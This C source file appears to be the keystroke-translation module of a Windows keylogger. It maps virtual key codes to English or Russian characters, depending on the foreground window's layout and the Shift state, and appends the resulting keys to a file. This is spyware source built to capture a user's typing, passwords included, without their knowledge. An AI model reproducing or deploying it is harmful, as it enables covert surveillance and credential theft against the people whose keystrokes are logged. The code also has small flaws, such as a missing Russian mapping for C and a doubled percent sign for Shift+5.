#include <stdio.h>

#include "key.h"

bool is_key_ru(void){
    HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
    if(HIWORD(keyboard) == RU)
        return true;
    return false;
}

void save_file(const char *filename, const char *key){
    FILE *file = NULL;
    if((file = fopen(filename, "a")) != NULL){
        fprintf(file, "%s", key);
        fclose(file);
    }
}

const char* key_value(const int code){
    switch(code){
        case VK_A :
            if(is_key_ru() == true){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ф";
                else
                    return "ф";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "A";
            else
                return "a";
        case VK_B :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "И";
                else
                    return "и";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "B";
            else
                return "b";
        case VK_C :
            if(GetAsyncKeyState(VK_SHIFT))
                return "C";
            else
                return "c";
        case VK_D :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "В";
                else
                    return "в";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "D";
            else
                return "d";
        case VK_E :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "У";
                else
                    return "у";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "E";
            else
                return "e";
        case VK_F :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "А";
                else
                    return "а";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "F";
            else
                return "f";
        case VK_G :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "П";
                else
                    return "п";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "G";
            else
                return "g";
        case VK_H :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Р";
                else
                    return "р";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "H";
            else
                return "h";
        case VK_I :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ш";
                else
                    return "ш";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "I";
            else
                return "i";
        case VK_J :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "О";
                else
                    return "о";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "J";
            else
                return "j";
        case VK_K :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Л";
                else
                    return "л";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "K";
            else
                return "k";
        case VK_L :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Д";
                else
                    return "д";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "L";
            else
                return "l";
        case VK_M :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ь";
                else
                    return "ь";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "M";
            else
                return "m";
        case VK_N :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Т";
                else
                    return "т";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "N";
            else
                return "n";
        case VK_O :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Щ";
                else
                    return "щ";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "O";
            else
                return "o";
        case VK_P :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "З";
                else
                    return "з";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "P";
            else
                return "p";
        case VK_Q :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Й";
                else
                    return "й";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "Q";
            else
                return "q";
        case VK_R :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "К";
                else
                    return "к";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "R";
            else
                return "r";
        case VK_S :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ы";
                else
                    return "ы";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "S";
            else
                return "s";
        case VK_T :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Е";
                else
                    return "е";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "T";
            else
                return "t";
        case VK_U :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Г";
                else
                    return "г";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "U";
            else
                return "u";
        case VK_V :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "М";
                else
                    return "м";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "V";
            else
                return "v";
        case VK_W :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ц";
                else
                    return "ц";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "W";
            else
                return "w";
        case VK_X :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ч";
                else
                    return "ч";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "X";
            else
                return "x";
        case VK_Y :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Н";
                else
                    return "н";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "Y";
            else
                return "y";
        case VK_Z :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Я";
                else
                    return "я";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "Z";
            else
                return "z";
        case VK_0 :
            if(GetAsyncKeyState(VK_SHIFT))
                return ")";
            else
                return "0";
        case VK_1 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "!";
            else
                return "1";
        case VK_2 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "@";
            else
                return "2";
        case VK_3 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "#";
            else
                return "3";
        case VK_4 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "$";
            else
                return "4";
        case VK_5 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "%%";
            else
                return "5";
        case VK_6 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "^";
            else
                return "6";
        case VK_7 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "&";
            else
                return "7";
        case VK_8 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "*";
            else
                return "8";
        case VK_9 :
            if(GetAsyncKeyState(VK_SHIFT))
                return "(";
            else
                return "9";
        case VK_TILDE :
            if(GetAsyncKeyState(VK_SHIFT))
                return "~";
            else
                return "`";
        case VK_DASH :
            if(GetAsyncKeyState(VK_SHIFT))
                return "_";
            else
                return "-";
        case VK_EQ :
            if(GetAsyncKeyState(VK_SHIFT))
                return "+";
            else
                return "=";
        case VK_LBRACKET :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Х";
                else
                    return "х";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "{";
            else
                return "[";
        case VK_RBRACKET :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ъ";
                else
                    return "ъ";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "}";
            else
                return "]";
        case VK_DOT_COMMA :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ж";
                else
                    return "ж";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return ":";
            else
                return ";";
        case VK_APOSTROPHE :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Э";
                else
                    return "э";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "\"";
            else
                return "'";
        case VK_REV_SLASH :
            if(GetAsyncKeyState(VK_SHIFT))
                return "|";
            else
                return "\\";
        case VK_COMMA :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Б";
                else
                    return "б";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return "<";
            else
                return ",";
        case VK_DOT :
            if(is_key_ru()){
                if(GetAsyncKeyState(VK_SHIFT))
                    return "Ю";
                else
                    return "ю";
            }
            else if(GetAsyncKeyState(VK_SHIFT))
                return ">";
            else
                return ".";
        case VK_SLASH :
            if(GetAsyncKeyState(VK_SHIFT))
                return "?";
            else
                return "/";
        case VK_NUMPAD0 :
            return "0";
        case VK_NUMPAD1 :
            return "1";
        case VK_NUMPAD2 :
            return "2";
        case VK_NUMPAD3 :
            return "3";
        case VK_NUMPAD4 :
            return "4";
        case VK_NUMPAD5 :
            return "5";
        case VK_NUMPAD6 :
            return "6";
        case VK_NUMPAD7 :
            return "7";
        case VK_NUMPAD8 :
            return "8";
        case VK_NUMPAD9 :
            return "9";
        case VK_MULTIPLY :
            return "*";
        case VK_ADD :
            return "+";
        case VK_SUBTRACT :
            return "-";
        case VK_DIVIDE :
            return "/";
        case VK_DECIMAL :
            return ".";
        case VK_SPACE :
            return " ";
        case VK_TAB :
            return "\t";
        case VK_CAPITAL :
            return "<CAPS LOCK>";
        case VK_RETURN :
            return "\n";
        case VK_BACK :
            return "<BACK SPACE>";
    }
	return "";
}
